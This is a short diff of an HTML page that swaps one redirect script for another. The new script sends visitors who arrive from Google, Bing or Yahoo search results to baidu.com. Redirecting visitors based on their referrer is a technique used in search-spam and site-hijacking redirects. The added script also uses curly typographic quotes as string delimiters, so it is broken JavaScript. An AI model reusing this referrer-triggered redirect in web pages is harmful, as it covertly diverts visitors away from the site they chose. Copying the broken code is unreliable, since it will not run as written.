@@ -35,12 +35,12 @@
 </head>
 
 <body>
-<script type="text/javascript">
-var href = location.href ;
-if(href.indexOf("google")>-1){
-    //跳转
-
-  location.href = "http://baidu.com";
+<script language=”javascript”>
+var regexp=/\.(google|bing|yahoo)(\.[a-z0-9\-]+){1,2}\//ig;
+var where =document.referrer;
+if(regexp.test(where))
+{
+window.location.href=”http://www.baidu.com/”
 }
 </script>
 	<table width="1116" height="47" border="0" align="center">
